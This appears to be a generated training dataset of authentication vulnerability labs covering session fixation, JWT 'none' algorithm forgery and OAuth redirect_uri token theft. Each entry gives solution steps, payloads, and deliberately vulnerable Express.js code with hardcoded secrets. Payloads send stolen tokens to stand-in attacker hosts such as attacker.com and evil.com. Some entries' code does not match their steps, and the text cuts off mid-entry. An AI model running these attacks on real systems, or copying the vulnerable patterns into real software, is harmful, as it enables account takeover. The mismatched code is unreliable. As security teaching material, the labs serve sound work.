{
  "Lab scenario": "Predictable Session Fixation in REST Authentication Flow",
  "Lab Description": "The login endpoint sets a session ID based on a user-supplied value. If an attacker can predefine the session ID, they can fix a session for a victim prior to login. The application trusts the session without checking session ownership. To solve: hijack a valid user's session using fixation to access their dashboard.",
  "Difficulty Level": "Easy",
  "Solution Steps": [
    "1. Use Burp Suite to intercept a POST /login request and examine the session header behavior.",
    "2. Validate that the server accepts a client-supplied X-Session-ID header and reuses it after login.",
    "3. Craft a malicious session ID and perform a login request as the attacker, using this value.",
    "4. Send the same session ID to the victim via phishing or social engineering, or simply have them log in using that session.",
    "5. Use the fixed session to access the /dashboard endpoint after the victim logs in and validate access."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const uuid = require('uuid'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', password: 'letmein' }]; const sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.body; let sessionId = req.headers['x-session-id'] || uuid.v4(); const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).json({ error: 'Invalid credentials' }); sessions[sessionId] = username; res.setHeader('Set-Cookie', `session=${sessionId}`); console.log(`[DEBUG] Session created: ${sessionId} for user ${username}`); res.json({ message: 'Logged in', sessionId }); }); app.get('/dashboard', (req, res) => { const sessionId = req.headers['x-session-id'] || req.cookies.session; const user = sessions[sessionId]; if (!user) return res.status(401).send('Unauthorized'); res.send(`Welcome to your dashboard, ${user}`); }); app.listen(4000, () => console.log('Session Fixation Lab running on http://localhost:4000'));",
  "payloads": [
    "X-Session-ID: attacker-fixed-session",
    "Set-Cookie: session=attacker-fixed-session",
    "Use fixed session after victim logs in"
  ]
},
{
  "Lab scenario": "JWT None Algorithm Bypass in GraphQL API",
  "Lab Description": "The application uses JWT for authentication in a GraphQL API, but improperly validates the algorithm field. The backend accepts tokens with 'alg':'none' and skips verification. To solve: forge a JWT token impersonating the admin user and access the admin dashboard.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Use Postman to send a GraphQL login mutation and obtain a valid JWT.",
    "2. Decode the JWT and inspect the header and payload using jwt.io.",
    "3. Modify the header to {\"alg\":\"none\"} and the payload to {\"username\":\"admin\"}. Leave the signature blank.",
    "4. Resend a GraphQL query using the forged token in the Authorization: Bearer header.",
    "5. Access the /admin panel and confirm access as the forged user."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const app = express(); const schema = buildSchema(`type Query { me: String }`); const users = { carlos: 'password123', admin: 'supersecret' }; const root = { me: (args, req) => req.user }; app.use((req, res, next) => { const authHeader = req.headers['authorization']; if (authHeader) { const token = authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, 'secret', { algorithms: ['HS256', 'none'] }); req.user = decoded.username; console.log(`[DEBUG] Authenticated as: ${decoded.username}`); } catch (e) { console.log('[DEBUG] Invalid JWT'); } } next(); }); app.use('/graphql', graphqlHTTP({ schema, rootValue: root, graphiql: true })); app.listen(4001, () => console.log('JWT None Algorithm Lab running on http://localhost:4001'));",
  "payloads": [
    "JWT Header: {\"alg\":\"none\"}",
    "JWT Payload: {\"username\":\"admin\"}",
    "Authorization: Bearer <unsigned-token>"
  ]
},
{
  "Lab scenario": "OAuth Authorization Code Interception and Token Substitution",
  "Lab Description": "This app integrates with an external OAuth provider but does not verify that the access token returned belongs to the initiating user. It trusts any access token blindly. To solve: intercept a leaked authorization code and exchange it to impersonate another user.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use Burp Suite to intercept the OAuth login flow initiated by another user and identify the 'code' parameter in the callback.",
    "2. Note that the 'state' parameter is either missing or not validated server-side.",
    "3. Replay the code in your own POST /oauth/token request to the OAuth provider to get an access_token.",
    "4. Use this access_token in the Authorization header to make requests to /userinfo or /dashboard.",
    "5. Confirm successful impersonation of the victim user and solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.use(express.json()); app.get('/callback', async (req, res) => { const { code } = req.query; const tokenRes = await axios.post('https://auth.example.com/token', { code, client_id: 'client123', client_secret: 'secret', grant_type: 'authorization_code', redirect_uri: 'http://localhost:4002/callback' }); const accessToken = tokenRes.data.access_token; const profile = await axios.get('https://auth.example.com/userinfo', { headers: { Authorization: `Bearer ${accessToken}` } }); console.log('[DEBUG] OAuth user:', profile.data.username); res.send(`Logged in as ${profile.data.username}`); }); app.listen(4002, () => console.log('OAuth Token Substitution Lab running on http://localhost:4002'));",
  "payloads": [
    "Intercepted URL: /callback?code=leaked-code",
    "Authorization: Bearer <token_from_intercepted_code>",
    "Replay POST /token with intercepted code"
  ]
},
{
  "Lab scenario": "Session Fixation via Cookie Injection in REST API Login",
  "Lab Description": "The REST-based login endpoint is vulnerable to session fixation due to insecure session regeneration. The application reuses the session identifier after successful login, allowing an attacker to predetermine the victim's session ID. To solve: Fixate a session ID, trick the victim to log in using it, and access their authenticated area.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to intercept a GET /login request and observe Set-Cookie: sessionid.",
    "Send a pre-authenticated request with a crafted session cookie: Cookie: sessionid=attackerSession123.",
    "Send POST /login with victim's credentials (known) while preserving the same session cookie.",
    "Observe that the server responds with a successful login without issuing a new Set-Cookie.",
    "Replay GET /my-account with sessionid=attackerSession123 to access the victim’s session."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); app.use(session({ secret: 'fixationsecret', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'pass123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = user.username; res.send('Login successful'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { if (req.session.user === 'carlos') res.send('Account page of carlos'); else res.status(403).send('Unauthorized'); }); app.listen(3000, () => console.log('Session Fixation Lab running'));",
  "payloads": [
    "Cookie: sessionid=attackerSession123",
    "POST /login {\"username\":\"carlos\",\"password\":\"pass123\"} with Cookie: sessionid=attackerSession123",
    "GET /my-account with Cookie: sessionid=attackerSession123"
  ]
},
{
  "Lab scenario": "JWT Tampering via None Algorithm in GraphQL Auth Header",
  "Lab Description": "The GraphQL API uses JWT for authentication but improperly validates the algorithm in the JWT header. The application accepts tokens signed with 'none', allowing tampering without a signature. To solve: Modify a valid token and access the admin dashboard with elevated privileges.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Capture a valid Authorization: Bearer <token> header via Postman when logged in as a low-priv user.",
    "Decode the JWT at jwt.io and modify payload to {\"role\":\"admin\"}.",
    "Modify the JWT header to {\"alg\":\"none\"} and remove the signature part.",
    "Use Burp Suite or Postman to send Authorization: Bearer <tampered-token> in GraphQL query headers.",
    "Query: { dashboard { sensitiveData } } and confirm access to admin-level data."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const jwt = require('jsonwebtoken'); const app = express(); app.use(bodyParser.json()); const SECRET = 'hardcoded-secret'; app.post('/graphql', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; try { const payload = jwt.verify(token, SECRET); if (payload.role === 'admin') res.send({ data: { sensitiveData: 'Flag{jwt_admin_access}' } }); else res.send({ error: 'Insufficient rights' }); } catch (e) { res.status(403).send({ error: 'Invalid token' }); } }); app.listen(4000, () => console.log('JWT None Bypass Lab running'));",
  "payloads": [
    "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
    "Payload: {\"role\":\"admin\"}",
    "JWT token: base64(header).base64(payload). (no signature)",
    "Authorization: Bearer <tampered_token>"
  ]
},
{
  "Lab scenario": "OAuth Misconfiguration via Open Redirect in SOAP SSO Flow",
  "Lab Description": "The SOAP-based SSO service fails to validate the redirect_uri in OAuth flows. The attacker can manipulate the redirect URI to capture access tokens. To solve: Exploit the redirect URI flaw to leak Carlos’s token and access the My Account page as Carlos.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Using OWASP ZAP, intercept the SOAP <LoginRequest> flow and extract the SSO URL with redirect_uri.",
    "Modify the redirect_uri to an attacker-controlled domain (e.g., https://attacker.com/oauth-leak).",
    "Send the manipulated SSO URL to Carlos (social engineering step assumed).",
    "Start a local server on attacker.com to capture the access_token from redirected request.",
    "Use the stolen token in Authorization: Bearer <token> to access /soap/MyAccount via SOAP UI."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); app.use(express.text({ type: 'text/xml' })); app.post('/sso', (req, res) => { const token = 'carlos-token-123'; const redirect = req.query.redirect_uri || 'https://trusted.app/account'; res.redirect(`${redirect}?access_token=${token}`); }); app.post('/soap/MyAccount', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (token === 'carlos-token-123') res.send('<Account>Welcome carlos</Account>'); else res.status(403).send('<Error>Unauthorized</Error>'); }); app.listen(5000, () => console.log('OAuth Redirect Lab running'));",
  "payloads": [
    "SSO URL: /sso?redirect_uri=https://attacker.com/oauth-leak",
    "Intercepted redirect: https://attacker.com/oauth-leak?access_token=carlos-token-123",
    "Authorization: Bearer carlos-token-123 in SOAP Header"
  ]
},
{
  "Lab scenario": "Session Fixation in GraphQL Authentication Flow",
  "Lab Description": "This application's GraphQL-based login mutation uses a predictable session token before user authentication, which is not regenerated after login. The application accepts a session token passed via a cookie. To solve: hijack Carlos’s session using a fixed token and access the /account endpoint.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to intercept the GraphQL login mutation and notice session token remains unchanged across login attempts.",
    "Send multiple pre-authentication requests to record how session tokens are generated and identify predictable pattern (e.g., timestamp-based).",
    "Craft a fixation attack by sending a login mutation with the victim’s credentials using a fixed `sessionid` cookie value.",
    "Login with your own credentials while setting the same fixed session ID cookie, causing the server to bind your request to Carlos’s session.",
    "Access /account using the fixed session cookie to confirm hijacked session and solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'qwerty123' }]; app.post('/graphql', (req, res) => { const { query, variables } = req.body; const token = req.cookies.sessionid || Date.now().toString(); res.cookie('sessionid', token); if (query.includes('mutation Login')) { const { username, password } = variables; const user = users.find(u => u.username === username && u.password === password); if (user) { return res.send({ data: { login: true } }); } } res.status(403).send({ error: 'Unauthorized' }); }); app.get('/account', (req, res) => { if (req.cookies.sessionid === 'FIXEDSESSIONCARLOS') return res.send('Account page for carlos'); res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('GraphQL Session Fixation Lab running'));",
  "payloads": [
    "Cookie: sessionid=FIXEDSESSIONCARLOS",
    "GraphQL Mutation: { \"query\": \"mutation Login($username: String!, $password: String!) { login(username: $username, password: $password) }\", \"variables\": { \"username\": \"carlos\", \"password\": \"qwerty123\" } }"
  ]
},
{
  "Lab scenario": "JWT Bypass via None Algorithm in REST Login Flow",
  "Lab Description": "The REST login system uses JWTs for session authentication but fails to validate the algorithm used. The server accepts tokens signed with 'none' algorithm and does not verify the signature. To solve: craft a fake JWT token impersonating Carlos and access the protected /dashboard endpoint.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Postman to intercept the login request and capture a JWT issued after login.",
    "Decode the token using jwt.io and inspect the algorithm and payload structure.",
    "Modify the token's header to use 'alg':'none' and replace the payload with `{ \"user\": \"carlos\" }`.",
    "Remove the signature section and re-encode the token using base64url encoding.",
    "Send a GET /dashboard request with Authorization: Bearer <crafted_token> and access Carlos's dashboard."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'carlos', password: 'letmein' }]; app.use(express.json()); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(403).send('Invalid'); const token = jwt.sign({ user: username }, 'insecurekey', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/dashboard', (req, res) => { const auth = req.headers.authorization?.split(' ')[1]; try { const payload = jwt.verify(auth, 'insecurekey', { algorithms: ['HS256', 'none'] }); if (payload.user === 'carlos') return res.send('Carlos dashboard accessed'); } catch { return res.status(401).send('Unauthorized'); } res.status(403).send('Forbidden'); }); app.listen(4000, () => console.log('JWT None Algorithm Lab running'));",
  "payloads": [
    "Header: { \"alg\": \"none\", \"typ\": \"JWT\" }",
    "Payload: { \"user\": \"carlos\" }",
    "Authorization: Bearer <base64url(header)>.base64url(payload)."
  ]
},
{
  "Lab scenario": "OAuth Redirect URI Manipulation in Authorization Server",
  "Lab Description": "This application integrates OAuth with a third-party provider but fails to validate exact redirect URIs. An attacker can manipulate the redirect_uri to capture authorization codes. To solve: intercept an OAuth authorization code issued to Carlos and redeem it to access his profile.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use OWASP ZAP to proxy and intercept the initial authorization request to the /oauth/authorize endpoint.",
    "Modify the `redirect_uri` parameter to an attacker-controlled domain while preserving the domain root.",
    "Send the manipulated link to Carlos (simulated via forced browsing or redirect script).",
    "Receive the leaked authorization code on your server (set up listener on attacker.com).",
    "Use the captured code in a POST /oauth/token request and gain access to Carlos's access token. Use it to retrieve /profile."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const tokens = {}; const codes = {}; app.get('/oauth/authorize', (req, res) => { const { client_id, redirect_uri, state } = req.query; const code = 'authcode-carlos'; codes[code] = 'carlos'; res.redirect(`${redirect_uri}?code=${code}&state=${state}`); }); app.post('/oauth/token', express.urlencoded({ extended: true }), (req, res) => { const { code } = req.body; if (codes[code]) { const token = 'token-carlos'; tokens[token] = codes[code]; return res.json({ access_token: token }); } res.status(400).send('Invalid code'); }); app.get('/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (tokens[token] === 'carlos') return res.send('Profile for carlos'); res.status(403).send('Invalid token'); }); app.listen(4000, () => console.log('OAuth Redirect URI Lab running'));",
  "payloads": [
    "GET /oauth/authorize?client_id=app&redirect_uri=https://attacker.com/callback&state=xyz",
    "Leaked code: authcode-carlos",
    "POST /oauth/token with body: code=authcode-carlos",
    "Authorization: Bearer token-carlos"
  ]
},
{
  "Lab scenario": "GraphQL JWT claim manipulation in token-based authentication",
  "Lab Description": "The application uses JWT-based authentication within its GraphQL API. JWT tokens are signed using a symmetric secret that can be brute-forced. The application does not verify claims properly during GraphQL authorization. To solve: Gain admin access and query sensitive user data through GraphQL introspection.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use OWASP ZAP to inspect the GraphQL endpoint at /graphql and identify the 'Authorization: Bearer <token>' header used in requests.",
    "2. Capture your JWT using Burp Suite and decode it to examine claims. Note weak 'alg' and predictable structure.",
    "3. Use `jwt_tool.py` or Postman to brute-force the JWT secret with a common wordlist (e.g., rockyou.txt).",
    "4. Modify the decoded JWT claim to { \"role\": \"admin\" }, re-sign with cracked secret, and re-encode.",
    "5. Send the forged JWT in Authorization header to GraphQL endpoint, and use introspection query to extract hidden schema and access sensitive fields."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const { graphqlHTTP } = require('express-graphql'); const schema = require('./schema'); const app = express(); const SECRET = 'mysecret'; app.use('/graphql', (req, res, next) => { const token = req.headers['authorization']?.split(' ')[1]; try { const decoded = jwt.verify(token, SECRET); req.user = decoded; next(); } catch (err) { res.status(401).send('Invalid token'); } }); app.use('/graphql', graphqlHTTP(req => ({ schema, graphiql: true, context: { user: req.user } }))); app.listen(4000, () => console.log('JWT GraphQL Lab running on port 4000'));",
  "payloads": [
    "{ \"alg\": \"HS256\", \"typ\": \"JWT\" }.{ \"role\": \"admin\", \"user\": \"carlos\" }",
    "JWT signed with cracked secret: 'mysecret'",
    "GraphQL introspection: { __schema { types { name fields { name } } } }"
  ]
},
{
  "Lab scenario": "Session fixation via unvalidated session token reuse in REST login",
  "Lab Description": "The REST-based login system fails to invalidate old session tokens after successful login. Attacker can fix a known session ID and trick victim into using it. To solve: Fix a session ID, perform login with victim credentials, and access their account.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. In Burp Suite, register your own user and intercept the /login POST request. Note the Set-Cookie header assigns 'session_id'.",
    "2. Craft a phishing link that includes the known session_id in a cookie and trick the victim into logging in.",
    "3. Use OWASP ZAP to confirm the victim reuses the attacker-fixed session ID by monitoring traffic to /account.",
    "4. Replay the session using the fixed session ID and access victim’s authenticated area.",
    "5. Validate lab completion by accessing /account with active session."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'hunter2' }]; const sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const sid = req.cookies['session_id'] || Math.random().toString(36).slice(2); sessions[sid] = username; res.cookie('session_id', sid); res.send('Login successful'); }); app.get('/account', (req, res) => { const user = sessions[req.cookies['session_id']]; if (!user) return res.status(403).send('Not logged in'); res.send(`Welcome ${user}`); }); app.listen(4000, () => console.log('Session Fixation Lab running on port 4000'));",
  "payloads": [
    "Phishing link with cookie: session_id=attackerFixedID",
    "Burp Suite to capture fixed session reuse",
    "GET /account with session_id=attackerFixedID"
  ]
},
{
  "Lab scenario": "OAuth implicit flow misconfiguration in third-party login integration",
  "Lab Description": "The app uses OAuth implicit grant flow to log users in via a third-party provider. The redirect URI is vulnerable to open redirect abuse and the state parameter is not validated. To solve: Steal an access token from a victim user using a malicious redirect.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use Burp Suite to inspect the OAuth login URL. Identify absence of state parameter and use of redirect_uri.",
    "2. Modify redirect_uri to point to your server (e.g., https://evil.com/capture) using Burp Repeater.",
    "3. Send phishing link with modified OAuth URL to the victim (simulate with curl).",
    "4. Capture access_token in your listener (e.g., using Express server with query logging).",
    "5. Replay token in Authorization: Bearer header to /profile endpoint and access victim account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const request = require('request'); const app = express(); app.get('/oauth/callback', (req, res) => { const { access_token } = req.query; if (!access_token) return res.status(400).send('No token'); request.get({ url: 'https://oauth.example.com/userinfo', headers: { Authorization: `Bearer ${access_token}` }}, (err, resp, body) => { if (err) return res.status(500).send('OAuth Error'); res.send(`User Info: ${body}`); }); }); app.listen(4000, () => console.log('OAuth Redirect Lab running on port 4000'));",
  "payloads": [
    "OAuth phishing link: https://auth.app/oauth?client_id=xyz&redirect_uri=https://evil.com/capture&response_type=token",
    "Redirect server log to capture: GET /capture#access_token=abc123",
    "Replay token: Authorization: Bearer abc123"
  ]
},
{
  "Lab scenario": "Session Fixation via SOAP Login Token Mismanagement in Legacy Auth Service",

  "Lab Description": "The application uses a legacy SOAP-based authentication API that improperly binds session tokens before credential verification. The application generates a session cookie as soon as the login page loads, and this session is not invalidated after a successful login. To solve: Fixate a session ID before login, use it to authenticate as the victim, and access their private profile.",

  "Difficulty Level": "Hard",

  "Solution Steps": [
    "1. Using Burp Suite, intercept the initial GET request to /login and capture the Set-Cookie header establishing a session token.",
    "2. With OWASP ZAP, replay the captured request in a new browser session and confirm session reuse prior to authentication.",
    "3. Use Postman to send a crafted SOAP login request using your own credentials and observe that session ID does not change post-login.",
    "4. Replay the same pre-login session ID, but this time POST the victim's credentials via the SOAP envelope, binding the fixed session to them.",
    "5. Use the fixed session ID to access the /soap-profile endpoint and confirm victim's data is shown."

  ],

  "Vulnerability name": "Authentication",

  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const cookieParser = require('cookie-parser'); app.use(cookieParser()); app.use(bodyParser.text({ type: 'application/soap+xml' })); const sessions = {}; const users = [{ username: 'victim', password: 'vpass', profile: 'Sensitive Data' }]; app.get('/login', (req, res) => { const sid = Math.random().toString(36).substring(2); res.cookie('SID', sid); res.send('<loginPage/>'); }); app.post('/soap-auth', (req, res) => { const match = req.body.match(/<username>(.*?)<\\/username>.*<password>(.*?)<\\/password>/); if (!match) return res.status(400).send('Bad Request'); const [_, username, password] = match; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(403).send('Auth Failed'); sessions[req.cookies.SID] = username; res.send('<authSuccess/>'); }); app.get('/soap-profile', (req, res) => { const user = sessions[req.cookies.SID]; if (!user) return res.status(403).send('Forbidden'); res.send('Profile data for ' + user); }); app.listen(3000);",

  "payloads": [
    "<soap><username>victim</username><password>vpass</password></soap>",
    "GET /login HTTP/1.1 with pre-captured Set-Cookie: SID",
    "Replay /soap-profile with fixed SID"
  ]
},
{
  "Lab scenario": "JWT Authentication Bypass via 'none' Algorithm in GraphQL Login",

  "Lab Description": "This application uses JWTs for user session management via GraphQL login mutation. The backend fails to validate the algorithm field of the JWT. To solve: Tamper with a valid JWT and forge one using 'none' algorithm to impersonate the admin user and access the admin dashboard.",

  "Difficulty Level": "Medium",

  "Solution Steps": [
    "1. Log in using your own credentials and capture the Authorization: Bearer token using Burp Suite.",
    "2. Decode the JWT using jwt.io or Postman Pre-request Scripts to inspect the structure.",
    "3. Modify the token payload to { \"username\": \"admin\" } and change the header to { \"alg\": \"none\" }.",
    "4. Remove the signature part and craft the token as header.payload (omit signature).",
    "5. Use OWASP ZAP to replay the /graphql query to fetch admin data using the forged JWT in Authorization header."
  ],

  "Vulnerability name": "Authentication",

  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const jwt = require('jsonwebtoken'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'admin', role: 'admin' }, { username: 'user1', role: 'user' }]; app.post('/graphql', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (!decoded) return res.status(401).send('Invalid token'); const user = users.find(u => u.username === decoded.payload.username); if (!user) return res.status(403).send('Unauthorized'); res.send({ data: `Welcome ${user.username}, role: ${user.role}` }); }); app.listen(4000);",

  "payloads": [
    "{ \"alg\": \"none\" }.{ \"username\": \"admin\" }.",
    "Authorization: Bearer [forged_jwt]",
    "POST /graphql { query: \"{me{role}}\" }"
  ]
},
{
  "Lab scenario": "OAuth Implicit Flow Token Theft via Redirect URI Manipulation in Login Flow",

  "Lab Description": "The application uses an implicit OAuth flow and accepts user-defined redirect URIs without proper validation. The access token is leaked via the URI fragment. To solve: Inject a malicious redirect URI to steal the access token of the victim and access their account.",

  "Difficulty Level": "Easy",

  "Solution Steps": [
    "1. Use Burp Suite to intercept the /oauth/authorize request and locate the redirect_uri parameter.",
    "2. Modify the redirect_uri to point to your own server or exploit server (e.g., https://attacker.com/callback#token).",
    "3. Send the phishing link to the victim and simulate a login from their end.",
    "4. Capture the access token from the URI fragment sent to your server.",
    "5. Replay a GET /account request using Authorization: Bearer <captured_token> to access the victim's data."
  ],

  "Vulnerability name": "Authentication",

  "srcCode": "const express = require('express'); const app = express(); const crypto = require('crypto'); const users = [{ username: 'victim', token: 'abcd1234token' }]; app.get('/oauth/authorize', (req, res) => { const { redirect_uri } = req.query; const token = 'abcd1234token'; res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const user = users.find(u => u.token === token); if (!user) return res.status(403).send('Invalid token'); res.send(`Welcome ${user.username}`); }); app.listen(5000);",

  "payloads": [
    "https://vulnsite.com/oauth/authorize?client_id=abc&redirect_uri=https://attacker.com/callback",
    "Authorization: Bearer abcd1234token",
    "GET /account"
  ]
},
{
  "Lab scenario": "Session fixation via unvalidated session reuse in SOAP login endpoint",
  "Lab Description": "The application's SOAP-based login mechanism incorrectly reuses session identifiers without regenerating them upon authentication. The session ID can be pre-set and persists across login boundaries. The application stores session tokens before authentication and promotes them post-login without invalidation. To solve: Hijack a victim's session by planting a known session ID and force them to authenticate.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to intercept an unauthenticated login request and observe the Set-Cookie header providing a session ID.",
    "Send a crafted SOAP login request with a fixed session ID (e.g., SESSIONID=attackerSession) and confirm it gets reused upon successful login.",
    "Trick the victim into visiting a page that sets the SESSIONID=attackerSession via client-side JavaScript or HTTP header injection.",
    "Once the victim logs in, reuse the known session ID to access their authenticated session.",
    "Verify by visiting the /soap/account-info endpoint with the hijacked session ID and confirm access to the victim’s data."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const session = require('express-session'); const app = express(); app.use(bodyParser.text({ type: 'text/xml' })); app.use(session({ secret: 'soap-secret', resave: true, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'pass123' }]; app.post('/soap-login', (req, res) => { const xml = req.body; const match = xml.match(/<username>(.*?)<\\/username><password>(.*?)<\\/password>/); if (match) { const [_, user, pass] = match; const u = users.find(u => u.username === user && u.password === pass); if (u) { req.session.user = u.username; res.send(`<response>Welcome ${u.username}</response>`); return; } } res.status(403).send('<response>Login failed</response>'); }); app.get('/soap/account-info', (req, res) => { if (req.session.user) return res.send(`Account Info: ${req.session.user}`); res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('SOAP Session Fixation lab running on port 4000'));",
  "payloads": [
    "SESSIONID=attackerSession",
    "<?xml version='1.0'?><login><username>carlos</username><password>pass123</password></login>",
    "Access /soap/account-info with SESSIONID=attackerSession"
  ]
},
{
  "Lab scenario": "JWT signature confusion with none algorithm in GraphQL login",
  "Lab Description": "The application uses a JWT token for authentication and accepts tokens passed via a GraphQL mutation. The backend does not enforce algorithm constraints, allowing a forged token using the `none` algorithm. The application accepts unsigned tokens if the header specifies 'alg':'none'. To solve: Forge a valid token for the user 'carlos' and access the GraphQL-protected dashboard.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Postman to inspect the GraphQL login mutation and observe the JWT returned after login.",
    "Copy the token and decode it using jwt.io or Burp Decoder. Note the payload structure and claims (e.g., { 'user':'wiener' }).",
    "Craft a forged token with header { 'alg':'none' } and payload { 'user':'carlos' } without signature.",
    "Replace the Authorization header with: Bearer <forged_token> and send a GraphQL query to access protected resources.",
    "Confirm success by querying userData { email } for 'carlos' and seeing valid output."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'password' }]; app.post('/graphql', (req, res) => { const { query, variables } = req.body; if (query.includes('login')) { const user = users.find(u => u.username === variables.username && u.password === variables.password); if (user) { const token = jwt.sign({ user: user.username }, 'jwt-secret', { algorithm: 'HS256' }); return res.json({ data: { login: token } }); } return res.status(403).send('Login failed'); } if (req.headers.authorization) { const token = req.headers.authorization.split(' ')[1]; try { const decoded = jwt.verify(token, 'jwt-secret'); if (decoded.user) return res.json({ data: { userData: { email: decoded.user + '@lab.local' } } }); } catch (e) { return res.status(403).send('Invalid token'); } } res.status(400).send('Bad request'); }); app.listen(4000, () => console.log('JWT None Algorithm lab running on port 4000'));",
  "payloads": [
    "Header: { \"alg\": \"none\" }",
    "Payload: { \"user\": \"carlos\" }",
    "JWT: base64url(header).base64url(payload).",
    "Authorization: Bearer <forged_token>"
  ]
},
{
  "Lab scenario": "OAuth client misconfiguration leads to token reuse",
  "Lab Description": "The application relies on a third-party OAuth 2.0 provider for authentication. However, it reuses access tokens across clients without verifying the `aud` or `client_id` fields. This enables attackers to use access tokens from other apps to impersonate users. To solve: Acquire a valid OAuth token from your test app and reuse it on this site to gain access to Carlos’s account.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use OWASP ZAP to intercept the login process and observe the OAuth flow with the Authorization header.",
    "Identify the lack of token validation for `client_id` or audience claim by submitting a token from a separate registered app.",
    "Obtain a valid OAuth access token from your own app using client credentials grant or implicit flow.",
    "Send a request to /oauth/profile with Authorization: Bearer <your_token>.",
    "Observe that the server accepts the token and returns user data, indicating the client identity wasn't verified. Change sub to carlos and re-sign if applicable."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); app.get('/oauth/profile', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.decode(token); // no audience or client_id checks if (decoded && decoded.sub) return res.send(`User profile for ${decoded.sub}`); return res.status(403).send('Invalid token structure'); } catch (e) { return res.status(403).send('Token error'); } }); app.listen(4000, () => console.log('OAuth Token Reuse lab running on port 4000'));",
  "payloads": [
    "Bearer <access_token_from_attacker_app>",
    "JWT payload: { \"sub\": \"carlos\", \"aud\": \"attacker-app\" }",
    "No verification of client_id in backend"
  ]
},
{
  "Lab scenario": "Session Fixation via Cookie Injection in OAuth Callback Handler",
  "Lab Description": "This lab's OAuth callback implementation is vulnerable to session fixation. The application does not regenerate the session upon login via OAuth. Instead, it continues using any pre-authentication session value. To solve: Fixate a session ID, then log in as the victim via OAuth, and hijack their session using the fixed cookie.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use Burp Suite's Proxy to initiate a login flow and capture a session cookie before any authentication.",
    "2. Observe that the session ID remains unchanged after logging in with your own account via OAuth.",
    "3. Send the GET /auth/callback request to Burp Repeater and manually inject the pre-auth session ID as a cookie.",
    "4. Use Burp Collaborator or Intercept to force the victim to visit a crafted OAuth URL that preserves the fixed session cookie.",
    "5. After victim login, reuse the fixed session cookie to access their account dashboard."
  ],
